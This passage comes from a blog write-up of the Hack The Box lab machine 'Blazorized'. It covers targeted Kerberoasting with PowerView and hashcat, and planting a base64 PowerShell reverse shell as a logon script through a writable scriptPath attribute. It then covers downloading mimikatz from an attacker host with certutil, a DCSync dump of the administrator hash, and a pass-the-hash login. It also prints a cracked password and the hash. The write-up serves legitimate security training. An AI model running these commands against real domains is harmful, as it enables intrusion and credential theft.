</code></pre><p><img src=/images/HTB-Blazorized/powerview_transfer.png alt="PowerView file transfer"></p><ul><li>Switch to a PowerShell prompt and import the PowerView module with the command below</li></ul><pre tabindex=0><code>Import-Module ./powerview.ps1
</code></pre><ol start=2><li>Add an arbitrary SPN to user <code>RSA_4810</code> account.</li></ol><pre tabindex=0><code>Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname=&#39;darryl/kscorpio&#39;}
</code></pre><ol start=3><li>Request a Kerberos Ticket, receive the password hash of <code>RSA_4810</code> and crack it offline.</li></ol><pre tabindex=0><code>Get-DomainSPNTicket -SPN darryl/kscorpio 
</code></pre><blockquote><p>You will need to do some formatting when you copy the hash because it is full of whitespaces.</p></blockquote><p><img src=/images/HTB-Blazorized/targeted_kerberoasting.png alt="Targeted kerberoast attack"></p><p>Using hashcat we crack the hash and recover the password <code>(Ni7856Do9854Ki05Ng0005 #)</code>.</p><pre tabindex=0><code>hashcat -m 13100 -a 0 RSA4810_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/HTB-Blazorized/RSA_4810_pwd.png alt="RSA_4810 password"></p><p>We can now login as <code>RSA_4810</code>.</p><pre tabindex=0><code>evil-winrm -u RSA_4810 -p &#34;(Ni7856Do9854Ki05Ng0005 #)&#34; -i blazorized.htb
</code></pre><p>This account does not seem to have anything interesting file-wise. Besides <code>Administrator</code> the only other user present in <code>C:\Users</code> is <code>SSA_6010</code>, so we probably need to move to this user.</p><h3 id=lateral-movement-shell-as-ssa_6010>Lateral Movement (shell as SSA_6010)</h3><p>Let&rsquo;s enumerate the ACLs in the domain involving permissions related to the user <code>RSA_4810</code>.</p><pre tabindex=0><code>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match &#34;rsa_4810&#34;}
</code></pre><p><img src=/images/HTB-Blazorized/write_scriptpath.png alt="ACL script-path information"></p><p>It turns out that <code>RSA_4810</code> has permission to modify the <code>Script-Path</code> property for <code>SSA_6010</code>. When I try to query the specific <code>scriptPath</code> for <code>SSA_6010</code> it comes back empty. This probably means that no logon script is currently set for the user.</p><p><img src=/images/HTB-Blazorized/scriptPath_query.png alt="scriptPath query"></p><p>The path to those scripts is usually relative to a network share designated for logon scripts such as the <code>SYSVOL</code> directory, it looks like we will need to manually find the directory and find which file we can write to. Its standard location is <code>C:\Windows\SYSVOL</code>.</p><p>In <code>C:\Windows\SYSVOL\sysvol\blazorized.htb\scripts</code> we discover that we have Full permissions on the directory <code>A32FF3AEAA23</code>.</p><p><img src=/images/HTB-Blazorized/SYSVOL_dir_perm.png alt="SYSVOL directory permissions"></p><ol><li>We set a logon script for the user <code>SSA_6010</code>.</li></ol><pre tabindex=0><code>Set-ADUser -Identity SSA_6010 -ScriptPath &#39;A32FF3AEAA23\revshell.bat&#39; 
</code></pre><ol start=2><li>We write a PowerShell reverse shell to <code>revshell.bat</code>, which will be automatically executed when <code>SSA_6010</code> logs in.</li></ol><ul><li>Get a PowerShell reverse shell on <a href=https://www.revshells.com/>revshells.com</a>, use the <code>PowerShell#3 (Base64)</code>.</li></ul><pre tabindex=0><code> echo &#34;powershell -e JAB...&#34; | Out-File -FilePath C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\revshell.bat -Encoding ASCII 
</code></pre><p><img src=/images/HTB-Blazorized/logon_script_revshell.png alt="Logon script revshell"></p><p>On our listener we catch a shell as <code>SSA_6010</code>.</p><p><img src=/images/HTB-Blazorized/SSA_6010_shell.png alt="SSA_6010 shell"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>We switch to a meterpreter shell, upload SharpHound to the target an run it a second time.</p><p><code>SSA_6010</code> is part of the <code>Super_Support_Administrators</code> group.</p><p><img src=/images/HTB-Blazorized/SSA_6010_group_membership.png alt="SSA_6010 group memberships"></p><p>The members of this group have the <code>DCSync</code> right on the Domain Controller. We can use this right to achieve a DCSync attack and get the administrator password hash.</p><blockquote><p>DCSync right is a permission typically granted to Domain Controllers in an AD environment. It is used to replicate directory information, including account credentials, across the domain. When a server has this permission, it can perform directory synchronization operations to keep data consistent between different domain controllers. With this right we can pretend to be a Domain Controller by sending a <code>DRSGetNCChanges</code> request to the target Domain Controller and when the Domain Controller responds, it sends sensitive information back to us, including password hashes for the requested accounts.</p></blockquote><p><img src=/images/HTB-Blazorized/DCSync_abuse.png alt="DCSync Abuse"></p><pre tabindex=0><code>certutil.exe -urlcache -split -f http://YOUR-IP:WEBSERVER_PORT/mimikatz.exe mimikatz.exe
</code></pre><p>Execute mimikatz with <code>.\mimikatz.exe</code> and to get the admin hash, run the following command.</p><pre tabindex=0><code>lsadump::dcsync /domain:blazorized.htb /user:administrator
</code></pre><p><img src=/images/HTB-Blazorized/admin-hash.png alt="admin password hash"></p><p>Now we login as <code>Administrator</code> with the hash, and read the root flag.</p><pre tabindex=0><code> evil-winrm -i 10.10.11.22 -u Administrator -H &#34;f55ed1465179ba374ec1cad05b34a5f3&#34; 
</code></pre><p><img src=/images/HTB-Blazorized/root_flag.png alt="Root flag"></p><p>This was a great box, I learned a lot pawning it. Below are some references that were useful to me. Thank you for reading this article and I hope it was of any help to you.</p><ul><li><a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync>HackTricks - DCSync</a></li><li><a href=https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/>SPN-jacking</a></li><li><a href="https://learn.microsoft.com/en-us/aspnet/core/blazor/host-and-deploy/webassembly-caching/?view=aspnetcore-8.0">ASP.NET Core Blazor WebAssembly .NET runtime and app bundle caching</a></li><li><a href=https://github.com/dotnet/AspNetCore.Docs/blob/main/aspnetcore/blazor/project-structure.md#blazor-web-app>Blazor Web App structure</a></li></ul></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-editorial/>&#8592;
Previous:
HTB: Editorial</a></p><p class=prev-post-date>October 16, 2024</p></div><div class=next-post><p><a href=/posts/htb-axlle/>Next:
HTB: Axlle
&#8594;</a></p><p class=next-post-date>November 15, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a><ul><li><a href=#lateral-movement-shell-as-rsa_4810>Lateral Movement (shell as RSA_4810)</a></li><li><a href=#lateral-movement-shell-as-ssa_6010>Lateral Movement (shell as SSA_6010)</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>